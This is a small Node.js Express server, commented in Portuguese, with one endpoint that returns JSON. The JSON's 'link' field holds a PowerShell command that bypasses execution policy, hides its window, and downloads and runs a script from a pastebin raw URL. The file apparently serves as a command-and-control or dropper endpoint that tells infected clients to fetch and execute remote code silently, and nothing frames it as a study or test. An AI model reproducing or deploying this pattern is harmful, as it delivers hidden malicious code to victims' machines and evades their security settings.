const express = require('express');
const app = express();

app.get('/dados', (req, res) => {
  const data = {
    dp: true,
    link: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command [scriptblock]::Create((Invoke-WebRequest "https://pastebin.com/raw/jW0p6fGc" -UseBasicParsing)).Invoke();"'
  };
  
  res.json(data);
});

const port = 80;
app.listen(port, () => {
  console.log(`Servidor ouvindo na porta ${port}`);
});
